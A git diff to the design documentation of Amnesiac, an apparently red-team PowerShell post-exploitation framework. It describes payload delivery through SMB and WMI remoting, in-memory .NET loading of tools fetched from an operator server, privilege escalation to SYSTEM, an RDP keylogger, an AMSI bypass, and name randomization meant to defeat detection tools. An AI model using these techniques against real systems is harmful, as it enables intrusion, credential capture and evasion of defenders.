@@ -45,7 +45,7 @@ Understanding which scenario applies is critical because the constraints differ 
 ```powershell
 runas /netonly /user:DOMAIN\username powershell.exe
 # In the new PS window — inherits Type-9 NewCredentials logon token:
-. .\Amnesiac.ps1; Amnesiac -Detached -IP <operator-IP>
+. .\Amnesiac.ps1; Amnesiac -NoDomain -IP <operator-IP>
 ```
 
 **Key characteristics:**
@@ -161,6 +161,13 @@ Operator                                    Target
 - Operator's machine cannot receive inbound connections (no port 445 open inbound)
 - Scenario 1 where firewall blocks reverse shell callbacks
 
+**Delivery workflow:** After the payload is copied to clipboard, `Print-MultiListener` prompts:
+```
+ [D] Open local shell to deliver payload (returns here to start listener)
+ [Enter] Start listener now
+```
+Press `D` to drop into `Start-LocalShell` — run `Invoke-SMBRemoting` or `Invoke-WMIRemoting` with the clipboard payload, then type `back`. The listener starts and polls for the connection automatically.
+
 **Target selection:** On non-domain-joined operator, `CheckReachableHosts` (AD enumeration) is unavailable. Operator is prompted to enter targets manually (comma-separated IPs/hostnames, `.` for localhost).
 
 **Session menu:** Sessions are listed as `[6]`, `[7]`, etc. — `[5]` is reserved for Local Shell. Sessions can be bookmarked (`bookmark <N>`), killed (`kill <N>`), or interacted with by number.
@@ -246,6 +253,17 @@ $global:ToolSources = @{
 
 **To add a new tool from an external repo:** add one entry here. The keyword dispatch in `Start-LocalShell` and `load <name>` will use it automatically via `Fetch-ToolFromGitHub`.
 
+### Binary Tool Fetch (`Fetch-BinaryTool`)
+
+Called by `RunBin` on cache miss. Uses `DownloadData` (binary-safe, not `DownloadString`) to fetch `.exe` or `.dll` binaries. Priority:
+
+1. `http://<ListenerIP>:8080/<name>.exe` (operator HTTP server)
+2. `http://<ListenerIP>:8080/<name>.dll`
+3. `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<name>.exe`
+4. `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<name>.dll`
+
+Result stored as base64 string in `$global:ToolCache` — same key as script tools, content type inferred from usage context (RunBin vs load).
+
 ### Target-Side Delivery
 
 The target never fetches tools from any network source. `Send-Module` streams from `$global:ToolCache` over the pipe. The target reassembles and executes in memory.
@@ -284,6 +302,26 @@ The target never fetches tools from any network source. `Send-Module` streams fr
 | `SessionHunter` | `Invoke-SessionHunter` | Invoke-SessionHunter.ps1 | Domain Actions | Tier 2 (Tools\) |
 | `PsMapExec` | `PsMapExec` | PsMapExec.ps1 | Domain Actions | Tier 2 (Tools\, local copy) + Tier 3 (`$global:ToolSources`) |
 
+### LPE Tools (local shell + sessions)
+
+| Keyword | Cache Key | File | Effect |
+|---------|-----------|------|--------|
+| `PowerUp` | `PowerUp` | PowerUp.ps1 | Load and auto-run `Invoke-AllChecks` |
+| `PrivescCheck` | `PrivescCheck` | PrivescCheck.ps1 | Load and auto-run `Invoke-PrivescCheck` |
+| `GodPotato` | `Invoke-GodPotato` | Invoke-GodPotato.ps1 | Load GodPotato; prompts for command to run as SYSTEM |
+
+### RunBin — Reflective .NET Assembly Loading
+
+`RunBin <name> [args]` loads a managed .NET assembly entirely in memory via `[Reflection.Assembly]::Load([byte[]])`. No disk write.
+
+**Fetch path:** `Fetch-BinaryTool` is called on cache miss. It tries `http://<ListenerIP>:8080/<name>.exe` then `.dll` (operator HTTP server), then falls back to GitHub. Uses `DownloadData` (binary-safe, not `DownloadString`). Result stored as base64 in `$global:ToolCache`.
+
+**Local shell:** loads bytes, calls `EntryPoint.Invoke($null, @(,[string[]]$args))`
+
+**Active session:** streams via `Send-Module` chunked protocol to target; target finds assembly in `[AppDomain]::CurrentDomain.GetAssemblies()` by name and calls `EntryPoint.Invoke`
+
+Scope: managed .NET assemblies with an entry point. For DLLs without entry points, use `load <name>` instead.
+
 ### Additional Tools in `Tools\` (no keyword mapping yet)
 
 | Cache Key | File | Description |
@@ -291,7 +329,7 @@ The target never fetches tools from any network source. `Send-Module` streams fr
 | `File-Server` | File-Server.ps1 | File server utility |
 | `Invoke-Patamenia` | Invoke-Patamenia.ps1 | Additional enumeration |
 | `Tkn_Access_Check` | Tkn_Access_Check.ps1 | Token access checking |
-| `RDPKeylog` | RDPKeylog.exe | RDP keylogger (binary — loaded via `[Reflection.Assembly]::Load`) |
+| `RDPKeylog` | RDPKeylog.exe | RDP keylogger (binary — loaded via `RunBin RDPKeylog`) |
 
 ---
 
@@ -353,6 +391,8 @@ Built with `csc.exe` (ships with .NET Framework — no SDK required). Source in 
 
 ### Modules
 
+> **Note:** Class and method names below are the source-level identifiers. At build time, `Build.ps1` randomizes all of these — the compiled DLL and all pipe invocations use the randomized names from the `$_al*` map block. See [Name Randomization](#name-randomization-build-time) below.
+
 | Class | Method | Purpose |
 |-------|--------|---------|
 | `Bypass` | `PatchAmsiPageGuard()` | PAGE_GUARD on AmsiScanBuffer + VEH handler — zero-byte-patch AMSI bypass |
@@ -374,8 +414,45 @@ cd AmnesiacLoader
 .\Build.ps1
 # Compiles all .cs files with csc.exe (/unsafe /optimize+ /debug-)
 # Base64-encodes result and writes $AmnesiacLoaderB64 to Amnesiac.ps1
+# Writes name map block to both Amnesiac.ps1 and Amnesiac_ShellReady.ps1
 # Preserves UTF-8 BOM
 ```
+
+Run once before an engagement. The blob and name map are baked in permanently — no rebuild needed per session. Re-run only when modifying C# source or wanting fresh randomized names for a new engagement.
+
+### Name Randomization (Build-Time)
+
+Every `Build.ps1` run produces a uniquely named assembly. The script applies word-boundary regex substitution on temp copies of all `.cs` source files before compiling, randomizing:
+
+| What | Details |
+|------|---------|
+| Namespace | Single random identifier replaces `AmnesiacLoader` throughout |
+| Public class names | `Bypass`, `Loader`, `Injector`, `SyscallResolver`, `CallStack`, `SleepMask`, `Stomper`, `UnmanagedPS`, `NativeLoader` — each replaced with a distinct random name |
+| Public method names | All exported methods (e.g., `PatchAmsiPageGuard`, `ConcealLoadedAssembly`, `InjectShellcode`, `MaskedSleep`, `SpawnUnmanagedPS`) replaced with random identifiers |
+| Output DLL name | Compiled artifact named `<random>.dll` |
+
+After compilation, `Build.ps1` writes a PS-side name map block bounded by `# !!AL-MAP-BEGIN!!` / `# !!AL-MAP-END!!` into both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`. The block defines variables used by all loader invocation sites:
+
+| Variable | Maps to |
+|----------|---------|
+| `$_alNs` | Randomized namespace |
+| `$_alStp` | Stomper class name |
+| `$_alConc` | `ConcealLoadedAssembly` method name |
+| `$_alInj` | Injector class name |
+| `$_alInPS` | `InjectUnmanagedPS` method name |
+| `$_alSpwn` | `SpawnUnmanagedPS` method name |
+| `$_alNL` | NativeLoader class name |
+| `$_alNLLd` | NativeLoader load method name |
+
+All pipe commands and payload snippets that invoke loader methods use PS reflection with these map variables rather than literal type/method name strings. A command sent over the pipe therefore never contains `AmnesiacLoader`, `Stomper`, `ConcealLoadedAssembly`, or any other stable class/method identifier.
+
+**Detection surfaces eliminated:**
+- Named pipe command content (pipe scanners and DLP)
+- ETW `AssemblyLoad` events (assembly name is random each build)
+- CLR heap metadata (type and method name strings scraped by memory scanners)
+- Static signature rules keyed on `AmnesiacLoader` namespace or class names
+
+**Auto-loader guard:** If `$AmnesiacLoaderB64` is empty when a session connects with AutoLoader enabled, a warning is printed: `[!] Auto-loader: blob not embedded — run AmnesiacLoader\Build.ps1 first`. The same warning fires when the operator types `autoloader on` with an empty blob — silent skip is not allowed.
 
 ---
 
@@ -415,8 +492,13 @@ cd AmnesiacLoader
 1. Operator selects [2] Bind Shell from main menu
 2. Show-PayloadMenu presents format picker
 3. Payload generated (server variant — target listens, operator connects)
-4. On non-domain operator: prompted for target list (AD enum unavailable)
-5. Payload deployed to targets (manual or via Remoting/WMI)
+   Payload copied to clipboard
+4. Delivery prompt:
+    [D] Open local shell to deliver payload
+    [Enter] Start listener now
+   → [D]: Start-LocalShell opens; operator runs Invoke-SMBRemoting/WMIRemoting;
+          types 'back' to return
+5. On non-domain operator: prompted for target list (AD enum unavailable)
 6. Print-MultiListener starts scan loop:
    - Scan-WaitingTargets polls every 500ms
    - Connects to \\target\pipe\name on each configured target
